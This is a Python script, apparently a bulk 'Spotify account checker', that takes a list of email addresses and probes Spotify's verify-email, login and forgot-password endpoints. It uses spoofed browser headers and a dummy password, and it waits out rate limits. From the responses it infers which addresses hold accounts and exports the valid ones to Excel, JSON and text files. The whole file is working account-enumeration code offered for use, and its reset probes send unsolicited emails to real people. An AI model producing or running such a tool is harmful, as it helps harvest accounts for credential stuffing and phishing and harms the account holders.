import requests
import json
import time
from datetime import datetime
import openpyxl
from openpyxl.styles import Font, PatternFill, Alignment
import re

class SpotifyChecker:
    def __init__(self):
        self.results = []
        self.valid_count = 0
        self.invalid_count = 0
        self.premium_count = 0
        self.free_count = 0
        
        # More realistic headers
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/json',
            'Referer': 'https://www.spotify.com/',
            'Origin': 'https://www.spotify.com',
        }
    
    def validate_email(self, email):
        """
        Basic email validation
        """
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email) is not None
    
    def check_spotify_account_v1(self, email):
        """
        Method 1: Check via Spotify signup endpoint
        Returns: (is_valid, account_type, message)
        """
        try:
            url = 'https://spclient.wg.spotify.com/identity-service/api/v1/auth/verify-email'
            
            payload = {
                'email': email.strip().lower()
            }
            
            response = requests.post(
                url,
                json=payload,
                headers=self.headers,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                
                # If account exists
                if 'id' in data or 'exists' in data:
                    return True, 'UNKNOWN', data
                
            elif response.status_code == 400:
                # Email format invalid or not found
                data = response.json()
                if 'error' in data:
                    error_msg = str(data['error']).lower()
                    if 'not found' in error_msg or 'invalid' in error_msg:
                        return False, None, 'NOT_FOUND'
            
            return None, None, f'Status: {response.status_code}'
            
        except Exception as e:
            return None, None, f'Error: {str(e)}'
    
    def check_spotify_account_v2(self, email):
        """
        Method 2: Check via login endpoint
        """
        try:
            url = 'https://accounts.spotify.com/api/login'
            
            # Don't send password, just check if email is recognized
            payload = {
                'username': email.strip().lower(),
                'password': 'check',
            }
            
            response = requests.post(
                url,
                json=payload,
                headers=self.headers,
                timeout=10,
                allow_redirects=False
            )
            
            response_text = response.text.lower()
            
            # If we get "wrong password" or similar, account EXISTS
            if response.status_code == 401:
                if 'invalid username' in response_text or 'wrong password' in response_text or 'incorrect' in response_text:
                    return True, 'UNKNOWN', response_text
                elif 'not found' in response_text or 'does not exist' in response_text:
                    return False, None, 'NOT_FOUND'
            
            # Status 200 might mean account exists
            if response.status_code == 200:
                try:
                    data = response.json()
                    if 'access_token' not in data:  # Real account but wrong password
                        return True, 'UNKNOWN', data
                except:
                    pass
            
            return None, None, f'Status: {response.status_code}'
            
        except Exception as e:
            return None, None, f'Error: {str(e)}'
    
    def check_spotify_account_v3(self, email):
        """
        Method 3: Check via password reset endpoint
        If password reset can send email, account exists
        """
        try:
            url = 'https://accounts.spotify.com/api/forgot-password'
            
            payload = {
                'identifier': email.strip().lower()
            }
            
            response = requests.post(
                url,
                json=payload,
                headers=self.headers,
                timeout=10
            )
            
            # If we get 429, we're being rate limited (account checking too fast)
            if response.status_code == 429:
                return None, None, 'RATE_LIMITED'
            
            response_text = response.text.lower()
            
            # Check response for indicators
            if response.status_code == 200:
                try:
                    data = response.json()
                    if 'error' not in data:
                        # Password reset sent - account exists!
                        return True, 'UNKNOWN', data
                except:
                    pass
            
            if 'not found' in response_text or 'does not exist' in response_text or response.status_code == 404:
                return False, None, 'NOT_FOUND'
            
            return None, None, f'Status: {response.status_code}'
            
        except Exception as e:
            return None, None, f'Error: {str(e)}'
    
    def check_spotify_account(self, email):
        """
        Main function - tries multiple methods
        """
        email = email.strip().lower()
        print(f"\n[*] Checking: {email}")
        
        # Validate email format first
        if not self.validate_email(email):
            print(f"[-] INVALID FORMAT - {email}")
            return False, None, 'INVALID_FORMAT'
        
        # Try multiple methods
        methods = [
            ('Method 1', self.check_spotify_account_v1),
            ('Method 2', self.check_spotify_account_v2),
            ('Method 3', self.check_spotify_account_v3),
        ]
        
        for method_name, method_func in methods:
            is_valid, account_type, details = method_func(email)
            
            if is_valid is not None:
                if is_valid:
                    return True, account_type or 'UNKNOWN', details
                elif not is_valid:
                    return False, None, details
            
            # Rate limiting - pause longer
            if details == 'RATE_LIMITED':
                print(f"[!] Rate limited, waiting 5 seconds...")
                time.sleep(5)
            
            time.sleep(1)
        
        # If all methods are inconclusive
        return None, None, 'INCONCLUSIVE'
    
    def check_multiple_emails(self, emails_list):
        """
        Check multiple emails from list
        """
        total = len(emails_list)
        print(f"\n{'='*60}")
        print(f"SPOTIFY ACCOUNT CHECKER")
        print(f"Total emails to check: {total}")
        print(f"{'='*60}\n")
        
        for index, email in enumerate(emails_list, 1):
            email = email.strip()
            if not email:
                continue
            
            is_valid, account_type, details = self.check_spotify_account(email)
            
            if is_valid is True:
                self.valid_count += 1
                print(f"[✓] VALID - {email}")
                
                result = {
                    'email': email,
                    'status': 'VALID',
                    'account_type': account_type,
                    'details': str(details)[:100],
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'index': index
                }
                self.results.append(result)
                
            elif is_valid is False:
                self.invalid_count += 1
                print(f"[✗] INVALID - {email}")
                
                result = {
                    'email': email,
                    'status': 'INVALID',
                    'account_type': None,
                    'details': str(details),
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'index': index
                }
                self.results.append(result)
            else:
                print(f"[?] INCONCLUSIVE - {email}")
                result = {
                    'email': email,
                    'status': 'INCONCLUSIVE',
                    'account_type': None,
                    'details': str(details),
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'index': index
                }
                self.results.append(result)
            
            # Add delay between checks to avoid rate limiting
            if index < total:
                time.sleep(2)
        
        self.print_summary()
    
    def print_summary(self):
        """
        Print summary statistics
        """
        inconclusive_count = len([r for r in self.results if r['status'] == 'INCONCLUSIVE'])
        
        print(f"\n{'='*60}")
        print(f"SUMMARY")
        print(f"{'='*60}")
        print(f"Total Checked: {len(self.results)}")
        print(f"[✓] Valid Accounts: {self.valid_count}")
        print(f"[✗] Invalid Accounts: {self.invalid_count}")
        print(f"[?] Inconclusive: {inconclusive_count}")
        print(f"\nNote: Spotify has strong anti-bot protection.")
        print(f"Inconclusive results may be valid but couldn't be verified.")
        print(f"{'='*60}\n")
    
    def save_results_xlsx(self, filename='spotify_results.xlsx'):
        """
        Save results to Excel file
        """
        if not self.results:
            print("[-] No results to save")
            return
        
        wb = openpyxl.Workbook()
        ws = wb.active
        ws.title = 'Results'
        
        # Headers
        headers = ['#', 'Email', 'Status', 'Details', 'Timestamp']
        ws.append(headers)
        
        # Style headers
        header_fill = PatternFill(start_color='1DB954', end_color='1DB954', fill_type='solid')
        header_font = Font(bold=True, color='FFFFFF')
        
        for cell in ws[1]:
            cell.fill = header_fill
            cell.font = header_font
            cell.alignment = Alignment(horizontal='center', vertical='center')
        
        # Add data
        for result in self.results:
            ws.append([
                result['index'],
                result['email'],
                result['status'],
                result['details'][:100],
                result['timestamp']
            ])
        
        # Color code rows
        for idx, row in enumerate(ws.iter_rows(min_row=2, max_row=len(self.results) + 1), 2):
            status = self.results[idx-2]['status']
            
            if status == 'VALID':
                fill_color = 'C6EFCE'  # Green
            elif status == 'INVALID':
                fill_color = 'FFC7CE'  # Red
            else:
                fill_color = 'FFFFCC'  # Yellow
            
            for cell in row:
                cell.fill = PatternFill(start_color=fill_color, end_color=fill_color, fill_type='solid')
        
        # Adjust column widths
        ws.column_dimensions['A'].width = 5
        ws.column_dimensions['B'].width = 35
        ws.column_dimensions['C'].width = 15
        ws.column_dimensions['D'].width = 50
        ws.column_dimensions['E'].width = 20
        
        wb.save(filename)
        print(f"[+] Results saved to {filename}")
    
    def save_results_json(self, filename='spotify_results.json'):
        """
        Save results to JSON file
        """
        if not self.results:
            print("[-] No results to save")
            return
        
        data = {
            'summary': {
                'total_checked': len(self.results),
                'valid_accounts': self.valid_count,
                'invalid_accounts': self.invalid_count,
                'inconclusive': len([r for r in self.results if r['status'] == 'INCONCLUSIVE'])
            },
            'results': self.results,
            'note': 'Spotify has strong anti-bot protection. Inconclusive results may be valid accounts that couldn\'t be verified.'
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        print(f"[+] Results saved to {filename}")
    
    def save_valid_only(self, filename='valid_spotify_emails.txt'):
        """
        Save only valid emails to text file
        """
        valid_emails = [r['email'] for r in self.results if r['status'] == 'VALID']
        
        if not valid_emails:
            print("[-] No valid emails to save")
            return
        
        with open(filename, 'w', encoding='utf-8') as f:
            for email in valid_emails:
                f.write(email + '\n')
        
        print(f"[+] {len(valid_emails)} valid emails saved to {filename}")

def load_emails(filename='emails.txt'):
    """
    Load emails from file
    """
    emails = []
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                email = line.strip()
                if email and '@' in email:
                    emails.append(email)
    except FileNotFoundError:
        print(f"[-] File {filename} not found")
    
    return emails

def main():
    print("\n" + "="*60)
    print("  SPOTIFY ACCOUNT CHECKER - IMPROVED")
    print("  Multiple verification methods")
    print("="*60)
    
    # Load emails
    emails = load_emails('emails.txt')
    
    if not emails:
        print("\n[-] emails.txt not found or empty")
        print("[*] Create emails.txt with one email per line")
        print("[*] Example:")
        print("    user1@gmail.com")
        print("    user2@yahoo.com")
        return
    
    print(f"\n[*] Loaded {len(emails)} email(s)")
    print("[!] This tool uses multiple methods to verify accounts")
    print("[!] Spotify has strong anti-bot protection\n")
    
    checker = SpotifyChecker()
    
    try:
        checker.check_multiple_emails(emails)
        
        # Save results
        print("\n[*] Saving results...\n")
        checker.save_results_xlsx()
        checker.save_results_json()
        checker.save_valid_only()
        
    except KeyboardInterrupt:
        print("\n[!] Process interrupted by user")
    except Exception as e:
        print(f"[-] Error: {str(e)}")

if __name__ == '__main__':
    main()
